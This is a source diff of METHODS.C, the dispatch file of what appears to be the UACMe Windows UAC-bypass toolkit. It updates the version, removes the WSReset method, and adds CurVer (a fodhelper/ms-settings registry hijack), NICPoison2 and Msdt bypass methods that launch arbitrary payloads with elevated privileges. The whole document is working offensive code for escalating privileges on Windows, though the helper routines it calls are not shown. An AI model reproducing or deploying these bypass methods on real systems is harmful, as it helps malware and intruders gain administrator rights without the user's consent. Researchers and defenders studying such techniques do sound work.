@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2015 - 2021
+*  (C) COPYRIGHT AUTHORS, 2015 - 2022
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.56
+*  VERSION:     3.59
 *
-*  DATE:        16 July 2021
+*  DATE:        04 Feb 2022
 *
 *  UAC bypass dispatch.
 *
@@ -34,7 +34,6 @@ UCM_API(MethodDccwCOM);
 UCM_API(MethodDirectoryMock);
 UCM_API(MethodShellSdctl);
 UCM_API(MethodTokenModUIAccess);
-UCM_API(MethodShellWSReset);
 UCM_API(MethodEditionUpgradeManager);
 UCM_API(MethodDebugObject);
 UCM_API(MethodShellChangePk);
@@ -45,6 +44,8 @@ UCM_API(MethodWscActionProtocol);
 UCM_API(MethodFwCplLua2);
 UCM_API(MethodProtocolHijack);
 UCM_API(MethodPca);
+UCM_API(MethodCurVer);
+UCM_API(MethodMsdt);
 
 ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodWow64Logger,
@@ -55,7 +56,8 @@ ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodFwCplLua2,
     UacMethodMsSettingsProtocol,
     UacMethodMsStoreProtocol,
-    UacMethodPca
+    UacMethodPca,
+    UacMethodCurVer
 };
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
@@ -115,7 +117,7 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodShellSdctl, { NT_WIN10_REDSTONE1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodTokenModUIAccess, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, FALSE },
-    { MethodShellWSReset, { NT_WIN10_REDSTONE4, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodEditionUpgradeManager, { NT_WIN10_REDSTONE1, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodDebugObject, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
@@ -128,7 +130,10 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodFwCplLua2, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodProtocolHijack, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodProtocolHijack, { NT_WIN10_REDSTONE5, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
-    { MethodPca, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
+    { MethodPca, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodCurVer, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodNICPoison, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodMsdt, { NT_WIN10_THRESHOLD1, MAXDWORD }, FUBUKI32_ID, FALSE, FALSE, TRUE }
 };
 
 /*
@@ -223,15 +228,12 @@ VOID PostCleanupAttempt(
     switch (Method) {
 
     case UacMethodDISM:
-        ucmMethodCleanupSingleItemSystem32(DISMCORE_DLL);
+    case UacMethodJunction:
+        ucmDismMethodCleanup();
         break;
 
     case UacMethodWow64Logger:
         ucmMethodCleanupSingleItemSystem32(WOW64LOG_DLL);
-        break;
-
-    case UacMethodJunction:
-        ucmJunctionMethodCleanup();
         break;
 
     case UacMethodSXSConsent:
@@ -549,37 +551,6 @@ UCM_API(MethodTokenModUIAccess)
         Parameter->PayloadSize);
 }
 
-UCM_API(MethodShellWSReset)
-{
-    NTSTATUS Result = STATUS_ACCESS_DENIED;
-    LPWSTR PayloadParameter = NULL, PayloadFinal = NULL;
-    SIZE_T Size;
-
-    if (g_ctx->OptionalParameterLength == 0)
-        PayloadParameter = g_ctx->szDefaultPayload;
-    else
-        PayloadParameter = g_ctx->szOptionalParameter;
-
-    Size = ((MAX_PATH * 2) + _strlen(PayloadParameter)) * sizeof(WCHAR);
-    PayloadFinal = supHeapAlloc(Size);
-    if (PayloadFinal) {
-
-        _strcpy(PayloadFinal, g_ctx->szSystemDirectory);
-        _strcat(PayloadFinal, CMD_EXE);
-        _strcat(PayloadFinal, RUN_CMD_COMMAND);
-        _strcat(PayloadFinal, PayloadParameter);
-
-        Result = ucmShellRegModMethod2(Parameter->Method,
-            T_APPXPACKAGE,
-            WSRESET_EXE,
-            PayloadFinal);
-
-        supHeapFree(PayloadFinal);
-    }
-
-    return Result;
-}
-
 UCM_API(MethodEditionUpgradeManager)
 {
 #ifndef _WIN64
@@ -632,9 +603,22 @@ UCM_API(MethodNICPoison)
     UNREFERENCED_PARAMETER(Parameter);
     return STATUS_NOT_SUPPORTED;
 #else
-    return ucmNICPoisonMethod(
-        Parameter->PayloadCode,
-        Parameter->PayloadSize);
+    if (Parameter->Method == UacMethodNICPoison) {
+
+        return ucmNICPoisonMethod(
+            Parameter->PayloadCode,
+            Parameter->PayloadSize);
+
+    }
+    else if (Parameter->Method == UacMethodNICPoison2) {
+
+        return ucmNICPoisonMethod2(
+            Parameter->PayloadCode,
+            Parameter->PayloadSize);
+
+    }
+    else 
+        return STATUS_NOT_SUPPORTED;
 #endif
 }
 
@@ -736,4 +720,38 @@ UCM_API(MethodPca)
         Parameter->PayloadCode,
         Parameter->PayloadSize);
 #endif
+}
+
+UCM_API(MethodCurVer)
+{
+    UNREFERENCED_PARAMETER(Parameter);
+#ifndef _WIN64
+    return STATUS_NOT_SUPPORTED;
+#else
+    LPWSTR lpszPayload = NULL;
+    LPWSTR lpszTargetApp = NULL;
+
+    WCHAR szTargetApp[MAX_PATH * 2];
+
+    if (g_ctx->OptionalParameterLength == 0)
+        lpszPayload = g_ctx->szDefaultPayload;
+    else
+        lpszPayload = g_ctx->szOptionalParameter;
+
+    lpszTargetApp = FODHELPER_EXE;
+    _strcpy(szTargetApp, g_ctx->szSystemDirectory);
+    _strcat(szTargetApp, lpszTargetApp);
+
+    return ucmShellRegModMethod3(T_MSSETTINGS,
+        szTargetApp,
+        lpszPayload);
+
+#endif
+}
+
+UCM_API(MethodMsdt)
+{
+    return ucmMsdtMethod(
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
 }
